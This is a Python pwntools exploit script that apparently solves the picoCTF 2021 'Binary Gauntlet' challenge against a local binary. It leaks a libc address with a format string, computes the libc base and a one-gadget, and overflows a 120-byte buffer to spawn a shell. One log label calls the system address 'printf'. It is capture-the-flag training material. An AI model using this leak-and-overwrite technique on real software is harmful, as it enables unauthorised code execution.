from pwn import *   #https://heartburn.dev/picoctf-2021-binary-exploitation/#binary-gauntlet-1

elf = ELF("./gauntlet")

r = elf.process()
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so') #Local libc

format_string = "%p-%p-%p-%p-%p-%p-%p"
junk = b'A'

r.sendline(format_string)
leak = r.recvline()
leak = leak.split(b"-")
#get the second address from the format string leak and convert to int
leaked_address = int(leak[1], 16)
#use offset to get system address
system_address = leaked_address - 3793792

#find libc base by removing our system from the discovered randomized system
libc.address = system_address - libc.symbols['system']
#add the gadget address to the libc base we've worked out
gadget = libc.address + 0x4f432

log.info(f"leaked libc address @ {hex(leaked_address)}")
log.info(f"printf address @ {hex(system_address)}")
log.info(f"libc base calculated @ {hex(libc.address)}")
log.info(f"gadget @ {hex(gadget)}")

exploit = b""
exploit += junk * (120 - len(exploit))
exploit += p64(gadget)

r.sendline(exploit)
r.interactive()
